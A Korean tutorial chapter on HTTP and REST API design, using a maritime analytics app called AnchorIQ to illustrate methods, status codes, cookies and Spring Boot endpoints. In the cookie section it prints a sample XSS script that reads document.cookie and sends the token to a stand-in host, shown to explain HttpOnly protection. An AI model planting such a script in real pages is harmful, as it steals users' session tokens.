# AnchorIQ CS 완전 가이드 — Part 2: HTTP와 REST API

---

# Chapter 2: HTTP — 브라우저와 서버의 대화 규칙

## 2.1 HTTP는 왜 필요한가

TCP로 연결이 수립되면 데이터를 주고받을 수 있습니다. 하지만 **어떤 형식**으로 보내야 할까요?

두 사람이 대화할 때도 규칙이 있습니다:
- 한 사람이 질문하면 다른 사람이 대답합니다
- 질문에는 "뭘 원하는지"가 포함되어야 합니다
- 대답에는 "결과가 어땠는지"가 포함되어야 합니다

HTTP(HyperText Transfer Protocol)는 바로 이 **대화 규칙**입니다.

```
규칙 1: 항상 "요청 → 응답" 쌍으로 동작합니다.
         요청 없이 서버가 먼저 말을 걸 수 없습니다.
         (WebSocket은 예외 — 나중에 설명)

규칙 2: 요청에는 "무엇을 원하는지"가 포함됩니다.
         GET = "보여줘", POST = "처리해줘"

규칙 3: 응답에는 "결과가 어떤지"가 포함됩니다.
         200 = "성공", 404 = "없다", 500 = "내가 고장났다"

규칙 4: 서버는 이전 대화를 기억하지 않습니다 (Stateless).
         매번 새로운 대화처럼 처리합니다.
         그래서 "나 누구야"를 매번 증명해야 합니다 (JWT 토큰).
```

---

## 2.2 HTTP 요청(Request) 완전 분석

AnchorIQ에서 AI 질의를 할 때 브라우저가 보내는 실제 HTTP 요청을 한 줄씩 분석합니다.

### 요청 라인 (Request Line)

```
POST /api/ai/query HTTP/1.1
│     │              │
│     │              └── 프로토콜 버전
│     │                  HTTP/1.1은 1997년에 만들어진 버전입니다.
│     │                  Keep-Alive(연결 재사용)가 기본 지원됩니다.
│     │                  HTTP/2는 멀티플렉싱(하나의 연결로 여러 요청)을 지원합니다.
│     │                  HTTP/3는 UDP 기반 QUIC 프로토콜을 사용합니다.
│     │
│     └── 경로 (Path)
│         서버에서 어떤 자원(Resource)을 요청하는지 나타냅니다.
│         /api/ai/query = "AI 질의 처리기"에게 보내는 요청
│
│         Spring Boot에서:
│         @RequestMapping("/api/ai") 클래스 레벨
│         @PostMapping("/query") 메서드 레벨
│         → /api/ai + /query = /api/ai/query
│
└── HTTP 메서드 (Method)
    "이 요청으로 뭘 하고 싶은지"를 나타냅니다.
    POST = "데이터를 보내서 처리해줘"
```

### HTTP 메서드 상세 비교

HTTP 메서드는 "동사"입니다. URL이 "명사(자원)"라면, 메서드는 "그 자원으로 뭘 할 것인지"를 나타냅니다.

```
┌─────────────────────────────────────────────────────────────┐
│                         GET                                  │
├─────────────────────────────────────────────────────────────┤
│ 의미: "이 자원을 보여줘"                                      │
│ 비유: 도서관에서 책을 읽는 것 (책이 변하지 않음)                 │
│                                                              │
│ 특징:                                                        │
│   - 서버의 상태를 바꾸지 않습니다 (안전, Safe)                  │
│   - 10번 실행해도 결과가 같습니다 (멱등, Idempotent)            │
│   - 요청에 Body(본문)가 없습니다                               │
│   - 데이터는 URL의 쿼리 파라미터로 전달합니다                   │
│   - 브라우저가 결과를 캐시할 수 있습니다                        │
│   - 브라우저 주소창에 URL이 보입니다                           │
│                                                              │
│ AnchorIQ 예시:                                               │
│   GET /api/ai/briefing                                       │
│   → 일일 브리핑 조회 (서버 데이터 변경 없음)                    │
│                                                              │
│   GET /api/vessels?flag=KR&type=TANKER                       │
│   → 한국 국적 유조선 목록 조회                                 │
│   → flag=KR, type=TANKER가 쿼리 파라미터                      │
│                                                              │
│   GET /api/ai/usage                                          │
│   → AI 사용량 조회                                            │
│                                                              │
│ Spring Boot 코드:                                            │
│   @GetMapping("/briefing")                                   │
│   public ResponseEntity<ApiResponse> getDailyBriefing() {    │
│       // Body 파라미터 없음 — GET은 본문이 없으므로            │
│       return ResponseEntity.ok(                              │
│           ApiResponse.success(service.getDailyBriefing()));  │
│   }                                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                         POST                                 │
├─────────────────────────────────────────────────────────────┤
│ 의미: "이 데이터를 처리해줘" 또는 "새로운 자원을 만들어줘"      │
│ 비유: 식당에서 주문서를 내는 것 (새 음식이 만들어짐)             │
│                                                              │
│ 특징:                                                        │
│   - 서버의 상태를 바꿀 수 있습니다 (비안전, Unsafe)             │
│   - 같은 요청을 보내도 결과가 다를 수 있습니다 (비멱등)          │
│     예: 회원가입을 2번 하면 "이미 존재" 에러                    │
│     예: AI 질의를 2번 하면 API 사용량이 2 증가                  │
│   - 요청에 Body(본문)가 있습니다                               │
│   - 데이터가 URL에 노출되지 않습니다 (보안상 유리)              │
│   - 기본적으로 캐시되지 않습니다                               │
│                                                              │
│ AnchorIQ 예시:                                               │
│   POST /api/ai/query                                         │
│   Body: {"query": "호르무즈 근처에 제재국 선박 있어?"}          │
│   → AI 질의 실행 (API 사용량 증가, 로그 기록 = 서버 상태 변경)  │
│                                                              │
│   POST /api/auth/signup                                      │
│   Body: {"email": "a@b.com", "password": "1234", "name": "A"}│
│   → 새 유저 생성 (DB에 레코드 추가 = 서버 상태 변경)           │
│                                                              │
│   POST /api/auth/login                                       │
│   Body: {"email": "a@b.com", "password": "1234"}             │
│   → 로그인 처리 (JWT 토큰 발급, 세션 기록)                     │
│                                                              │
│ Spring Boot 코드:                                            │
│   @PostMapping("/query")                                     │
│   public ResponseEntity<ApiResponse> query(                  │
│       @RequestBody AiQueryRequest request,                   │
│       // ↑ Body의 JSON을 AiQueryRequest 객체로 변환           │
│       @AuthenticationPrincipal UserPrincipal user             │
│       // ↑ JWT에서 추출한 사용자 정보                          │
│   ) {                                                        │
│       Map<String, Object> result =                           │
│           service.handleQuery(request.query(), user.userId());│
│       return ResponseEntity.ok(ApiResponse.success(result)); │
│   }                                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                         PUT                                  │
├─────────────────────────────────────────────────────────────┤
│ 의미: "이 자원을 이 내용으로 전체 교체해줘"                     │
│ 비유: 이력서를 통째로 새 버전으로 교체하는 것                    │
│                                                              │
│ 특징:                                                        │
│   - 멱등(Idempotent): 같은 PUT을 10번 해도 결과가 같음         │
│     (같은 이력서로 10번 교체해도 최종 이력서는 같음)             │
│   - Body에 자원의 완전한 표현을 포함                           │
│                                                              │
│ AnchorIQ 예시:                                               │
│   PUT /api/workflows/42                                      │
│   Body: {"name": "호르무즈 감시", "condition": "...",          │
│          "action": "slack", "active": true}                  │
│   → 워크플로우 #42를 이 내용으로 전체 교체                      │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                        DELETE                                │
├─────────────────────────────────────────────────────────────┤
│ 의미: "이 자원을 삭제해줘"                                     │
│ 비유: 도서관에서 책을 폐기 처리하는 것                          │
│                                                              │
│ 특징:                                                        │
│   - 멱등: 이미 삭제된 것을 또 삭제하면 404지만, 결과는 같음     │
│     (책이 없는 상태 = 이미 삭제된 상태)                        │
│   - 보통 Body가 없습니다                                      │
│                                                              │
│ AnchorIQ 예시:                                               │
│   DELETE /api/bookmarks/7                                    │
│   → 북마크 #7 삭제                                            │
└─────────────────────────────────────────────────────────────┘
```

### GET과 POST의 핵심 차이를 코드로 보기

```
GET 요청 — 데이터가 URL에 포함됨:

  브라우저 주소창: http://localhost:8080/api/vessels?flag=KR&type=TANKER
                                                    ↑ 쿼리 파라미터
  
  장점: 북마크 가능, 링크 공유 가능, 캐시 가능
  단점: URL에 노출됨, URL 길이 제한 (보통 2048자)
  
  Spring Boot:
  @GetMapping("/vessels")
  public ResponseEntity<ApiResponse> getVessels(
      @RequestParam(required = false) String flag,  // URL에서 추출
      @RequestParam(required = false) String type   // URL에서 추출
  ) { ... }


POST 요청 — 데이터가 Body에 포함됨:

  URL: http://localhost:8080/api/ai/query
  Body: {"query": "호르무즈 근처에 제재국 선박 있어?"}
                   ↑ URL에 안 보임
  
  장점: 데이터 크기 제한 없음, URL에 안 보임
  단점: 북마크/캐시 불가
  
  Spring Boot:
  @PostMapping("/query")
  public ResponseEntity<ApiResponse> query(
      @RequestBody AiQueryRequest request  // Body에서 추출 (JSON → 객체)
  ) { ... }
```

---

## 2.3 HTTP 응답(Response) 완전 분석

### 상태 코드 — 서버의 대답 요약

상태 코드는 **3자리 숫자**로, 서버가 요청을 어떻게 처리했는지 알려줍니다. 첫 번째 숫자가 카테고리를 나타냅니다.

```
┌─────────────────────────────────────────────────────────────┐
│ 2xx — 성공 (Success)                                         │
│                                                              │
│ 200 OK                                                       │
│   가장 일반적인 성공 응답.                                     │
│   AnchorIQ: AI 질의 성공, 일일 브리핑 조회 성공               │
│                                                              │
│   실제 응답:                                                  │
│   {                                                          │
│     "success": true,                                         │
│     "data": {                                                │
│       "answer": "현재 조회 결과상 호르무즈 인근에...",           │
│       "cypher": "MATCH (v:Vessel)...",                       │
│       "entities": []                                         │
│     },                                                       │
│     "timestamp": "2026-04-04T04:43:17.126Z"                 │
│   }                                                          │
│                                                              │
│ 201 Created                                                  │
│   새로운 자원이 생성되었을 때.                                 │
│   AnchorIQ: 회원가입 성공 시                                  │
│                                                              │
│   POST /api/auth/signup → 201 Created                        │
│   {                                                          │
│     "success": true,                                         │
│     "data": {                                                │
│       "id": 5,                                               │
│       "email": "aitest@anchoriq.com",                        │
│       "name": "AI Tester"                                    │
│     }                                                        │
│   }                                                          │
│                                                              │
│ 204 No Content                                               │
│   성공했지만 반환할 데이터가 없을 때.                           │
│   AnchorIQ: 북마크 삭제 성공 시 (삭제했으니 반환할 게 없음)     │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 4xx — 클라이언트 에러 (Client Error)                          │
│                                                              │
│ 400 Bad Request                                              │
│   요청 형식이 잘못되었을 때.                                   │
│                                                              │
│   어떤 상황에서 발생하나?                                     │
│   - JSON 형식이 깨졌을 때: {"query": }  ← 값이 없음           │
│   - 필수 필드가 없을 때: {} ← query 필드 자체가 없음           │
│   - 타입이 맞지 않을 때: {"query": 12345} ← 숫자인데 문자열 기대│
│   - @NotBlank 위반: {"query": ""} ← 빈 문자열                │
│                                                              │
│   Spring Boot에서 발생 과정:                                  │
│   ① Jackson이 JSON 파싱 시도                                 │
│   ② @Valid 어노테이션이 Bean Validation 실행                  │
│   ③ @NotBlank 위반 → MethodArgumentNotValidException 발생    │
│   ④ Spring이 자동으로 400 응답                                │
│                                                              │
│                                                              │
│ 401 Unauthorized                                             │
│   "너 누구야?" — 인증(Authentication)이 안 된 상태.            │
│                                                              │
│   어떤 상황에서 발생하나?                                     │
│   - JWT 토큰 없이 API 호출                                   │
│   - JWT 토큰이 만료됨                                        │
│   - JWT 토큰의 서명이 유효하지 않음 (위조)                     │
│                                                              │
│   AnchorIQ에서의 처리:                                       │
│   SecurityConfig.java에서:                                   │
│     .exceptionHandling(exception -> exception                │
│         .authenticationEntryPoint((request, response, ex) -> {│
│             response.setStatus(401);                         │
│             response.setContentType("application/json");     │
│             response.getWriter().write(                      │
│                 "{\"success\":false,\"error\":" +            │
│                 "{\"code\":\"UNAUTHORIZED\"," +              │
│                 "\"message\":\"Authentication required\"}}"); │
│         }))                                                  │
│                                                              │
│   프론트엔드에서의 처리:                                      │
│   401을 받으면 → POST /api/auth/refresh로 토큰 갱신 시도       │
│   갱신 실패하면 → 로그인 페이지로 리다이렉트                    │
│                                                              │
│                                                              │
│ 403 Forbidden                                                │
│   "넌 안 돼" — 인증은 됐지만 권한(Authorization)이 없는 상태.  │
│                                                              │
│   401과의 차이:                                               │
│   401: "너 누구야?" (로그인을 안 했거나 토큰이 잘못됨)         │
│   403: "너가 누군지는 알지만, 이 기능은 쓸 수 없어"            │
│                                                              │
│   AnchorIQ 예시:                                             │
│   - USER 역할인데 /api/admin/** 접근 시도 → 403              │
│   - FREE 플랜인데 What-if 시뮬레이션 시도 → 403              │
│                                                              │
│                                                              │
│ 404 Not Found                                                │
│   "그런 거 없어" — 요청한 자원이 존재하지 않음.                 │
│                                                              │
│   예시:                                                      │
│   GET /api/vessels/0000000 → IMO 0000000인 선박 없음 → 404   │
│   GET /api/nonexistent → 이런 경로 자체가 없음 → 404          │
│                                                              │
│                                                              │
│ 429 Too Many Requests                                        │
│   "좀 쉬어" — 요청이 너무 많을 때.                              │
│                                                              │
│   AnchorIQ에서:                                              │
│   FREE 플랜은 AI 질의가 하루 5회로 제한됩니다.                  │
│   6번째 질의 시: PlanLimitExceededException → 429             │
│                                                              │
│   코드:                                                      │
│   AiQueryApplicationServiceImpl.checkApiQuota(userId);       │
│   → subscriptionService.hasRemainingApiQuota(userId)가 false │
│   → throw new PlanLimitExceededException()                   │
│   → @ExceptionHandler가 429 응답으로 변환                     │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 5xx — 서버 에러 (Server Error)                                │
│                                                              │
│ 500 Internal Server Error                                    │
│   "내가 고장났어" — 서버에서 예상치 못한 오류 발생.              │
│                                                              │
│   어떤 상황에서 발생하나?                                     │
│   - NullPointerException (코드 버그)                          │
│   - Neo4j 연결이 끊어짐                                      │
│   - OpenClaw AI가 응답하지 않음                               │
│   - OutOfMemoryError (메모리 부족)                            │
│                                                              │
│ 502 Bad Gateway                                              │
│   Nginx가 백엔드(Spring Boot)에서 잘못된 응답을 받았을 때.      │
│   보통 Spring Boot가 죽어있거나 시작 중일 때 발생.              │
│                                                              │
│ 503 Service Unavailable                                      │
│   서버가 일시적으로 요청을 처리할 수 없을 때.                    │
│   배포 중이거나 과부하 상태.                                   │
│                                                              │
│ 504 Gateway Timeout                                          │
│   Nginx가 Spring Boot의 응답을 시간 내에 못 받았을 때.          │
│   AI 질의가 60초 넘게 걸리면 발생할 수 있음.                    │
│                                                              │
│   OpenClawClient의 timeout 설정: 60초                        │
│   Nginx의 proxy_read_timeout 설정을 이보다 길게 설정해야 함.   │
└─────────────────────────────────────────────────────────────┘
```

---

## 2.4 Cookie와 세션 — 서버가 사용자를 기억하는 방법

### 문제: HTTP는 Stateless인데 어떻게 로그인 상태를 유지하나?

HTTP의 핵심 특성 중 하나는 **Stateless(무상태)**입니다. 서버는 이전 요청을 기억하지 않습니다. 마치 금붕어처럼 매 요청이 완전히 새로운 요청입니다.

```
요청 1: POST /api/auth/login → 200 OK (로그인 성공!)
요청 2: GET /api/ai/briefing → 401 Unauthorized (너 누구야?)

서버: "아까 로그인했다고? 난 기억 안 나는데."
```

이 문제를 해결하는 방법이 **Cookie**와 **JWT**입니다.

### Cookie란?

Cookie는 **서버가 브라우저에게 "이걸 기억해두고 다음에 올 때 가져와"라고 주는 작은 데이터**입니다.

```
로그인 시:

  [브라우저] POST /api/auth/login → [서버]
  
  서버 응답 헤더:
    Set-Cookie: access_token=eyJhbG...; HttpOnly; Path=/; Max-Age=18000
    Set-Cookie: refresh_token=eyJhbG...; HttpOnly; Path=/api/auth/refresh; Max-Age=604800
  
  브라우저: "알겠어, 이 쿠키를 저장해두고 다음에 보낼게."

다음 요청 시:

  [브라우저] GET /api/ai/briefing → [서버]
  요청 헤더:
    Cookie: access_token=eyJhbG...
  
  브라우저가 자동으로 쿠키를 포함합니다.
  개발자가 따로 코드를 작성할 필요 없습니다.
```

### Cookie의 속성들

```
Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; Path=/; Max-Age=18000; SameSite=Lax

각 속성의 의미:

  access_token=eyJhbG...
    쿠키의 이름=값

  HttpOnly
    JavaScript에서 접근할 수 없습니다.
    document.cookie로 읽을 수 없습니다.
    
    왜 중요한가?
    XSS(Cross-Site Scripting) 공격 방어.
    해커가 웹페이지에 악성 JavaScript를 삽입해도
    토큰을 훔칠 수 없습니다.
    
    만약 HttpOnly가 없다면:
    <script>
      // 해커가 삽입한 코드
      const token = document.cookie;  // 토큰 탈취!
      fetch('https://hacker.com/steal?token=' + token);
    </script>
    
    HttpOnly가 있으면:
    document.cookie → "" (빈 문자열, 접근 불가!)

  Secure
    HTTPS 연결에서만 전송됩니다.
    HTTP로 요청 시 쿠키가 포함되지 않습니다.
    → 네트워크 도청으로 토큰 탈취 방지.
    (로컬 개발 시에는 보통 생략)

  Path=/
    이 경로 이하의 요청에만 쿠키를 전송합니다.
    Path=/ → 모든 요청에 포함
    Path=/api/auth/refresh → /api/auth/refresh 요청에만 포함
    
    AnchorIQ에서:
    access_token: Path=/ (모든 API에 필요)
    refresh_token: Path=/api/auth/refresh (갱신 요청에만 필요)

  Max-Age=18000
    쿠키의 수명 (초 단위).
    18000초 = 5시간.
    5시간 후 브라우저가 자동으로 쿠키를 삭제합니다.
    
    AnchorIQ 설정:
    Access Token: 18000초 (5시간)
    Refresh Token: 604800초 (7일)

  SameSite=Lax
    다른 사이트에서 링크를 통해 올 때만 쿠키 전송.
    CSRF(Cross-Site Request Forgery) 공격 방어.
```

---

# Chapter 3: REST API 설계

## 3.1 API란 무엇인가

API(Application Programming Interface)는 **프로그램들이 서로 대화하기 위한 약속된 인터페이스**입니다.

실생활 비유:

```
식당에서의 API:

  여러분(클라이언트)은 주방(서버) 안에 들어갈 수 없습니다.
  대신 메뉴판(API 문서)을 보고 주문(요청)하면
  웨이터(HTTP)가 전달하고, 음식(응답)이 나옵니다.
  
  메뉴판의 규칙:
  - 존재하는 메뉴만 주문 가능 (정의된 엔드포인트만 호출)
  - 메뉴별 가격이 다름 (인증/인가 레벨)
  - 재료가 떨어지면 "품절" (404, 503)
  
AnchorIQ의 API:
  
  프론트엔드(Next.js)는 백엔드(Spring Boot) 내부 코드를 모릅니다.
  대신 API 문서(Swagger)를 보고 HTTP 요청을 보내면
  약속된 형식의 JSON 응답을 받습니다.
```

## 3.2 REST란 무엇인가

REST(REpresentational State Transfer)는 **API를 설계하는 아키텍처 스타일**입니다. Roy Fielding이 2000년 박사 논문에서 제안했습니다.

### REST의 핵심 원칙

```
원칙 1: URL은 "자원(Resource)"을 나타냅니다.
  
  좋은 예:
    /api/vessels          → "선박" 자원
    /api/vessels/9863297  → "IMO 9863297번 선박" 자원
    /api/ai/query         → "AI 질의" 자원
    /api/risks/alerts     → "리스크 알림" 자원
  
  나쁜 예:
    /api/getVessels       → 동사 사용 (REST 위반)
    /api/deleteUser/5     → 동사 사용 (REST 위반)
    /api/vessel           → 단수형 (관례상 복수형 사용)

원칙 2: HTTP 메서드가 "행동"을 나타냅니다.

  GET    /api/vessels     → "선박 목록을 조회"
  GET    /api/vessels/123 → "123번 선박을 조회"
  POST   /api/vessels     → "새 선박을 등록"
  PUT    /api/vessels/123 → "123번 선박 정보를 수정"
  DELETE /api/vessels/123 → "123번 선박을 삭제"
  
  URL(명사)과 메서드(동사)의 조합으로 의미를 표현합니다.
  따로 동사를 URL에 넣을 필요가 없습니다.

원칙 3: Stateless — 서버는 상태를 저장하지 않습니다.
  
  각 요청은 독립적이며, 요청에 필요한 모든 정보를 포함합니다.
  "나 아까 로그인했잖아"가 안 됩니다.
  매 요청마다 JWT 토큰을 포함해야 합니다.
  
  장점:
  - 서버를 여러 대로 늘려도 세션 공유가 필요 없음
  - 요청을 아무 서버에나 보내도 동일하게 처리
  - 서버 재시작해도 클라이언트에 영향 없음

원칙 4: 일관된 응답 형식

  AnchorIQ의 모든 API는 같은 형식의 JSON을 반환합니다:
  
  성공:
  {
    "success": true,
    "data": { ... },        ← 실제 데이터
    "timestamp": "2026-..."
  }
  
  실패:
  {
    "success": false,
    "error": {
      "code": "UNAUTHORIZED",
      "message": "Authentication required"
    },
    "timestamp": "2026-..."
  }
  
  프론트엔드가 일관되게 처리할 수 있어서 코드가 단순해집니다:
  if (response.data.success) {
    // 성공 처리
  } else {
    // 에러 표시 (response.data.error.message)
  }
```

### AnchorIQ의 174개 REST API 구조

```
인증 (5개):
  POST   /api/auth/signup     → 회원가입 (201 Created)
  POST   /api/auth/login      → 로그인 (200 OK + Cookie)
  POST   /api/auth/refresh    → 토큰 갱신 (200 OK + 새 Cookie)
  POST   /api/auth/logout     → 로그아웃 (200 OK + Cookie 삭제)
  GET    /api/auth/me          → 내 정보 조회 (200 OK)

AI (9개):
  POST   /api/ai/query         → AI 질의 실행
  GET    /api/ai/usage         → AI 사용량 조회
  GET    /api/ai/briefing      → 일일 브리핑
  GET    /api/ai/recommendations → 추천 사항
  POST   /api/ai/whatif         → What-if 시뮬레이션 실행
  GET    /api/ai/whatif/templates → 시뮬레이션 템플릿 목록
  GET    /api/ai/whatif/history  → 시뮬레이션 이력
  POST   /api/ai/report/generate → 리포트 생성
  GET    /api/ai/report/{id}     → 리포트 조회/다운로드

선박 (13개):
  GET    /api/vessels           → 선박 목록 (페이지네이션)
  GET    /api/vessels/{imo}     → 선박 상세
  GET    /api/vessels/{imo}/risk → 선박 리스크 분석
  GET    /api/vessels/{imo}/relationships → 선박 관계 (온톨로지)
  GET    /api/vessels/{imo}/history → 선박 이력
  ...

(이하 174개 엔드포인트가 동일한 REST 규칙을 따름)
```

---

이 Part 2에서 다룬 것:
- HTTP 요청/응답의 모든 구성 요소
- GET, POST, PUT, DELETE의 차이와 실제 코드
- 상태 코드별 발생 상황과 AnchorIQ에서의 처리
- Cookie의 모든 속성과 보안 의미
- REST API 설계 원칙과 AnchorIQ 적용

다음 Part에서는 Spring Boot DDD 아키텍처와 JWT 인증을 같은 깊이로 다룹니다.
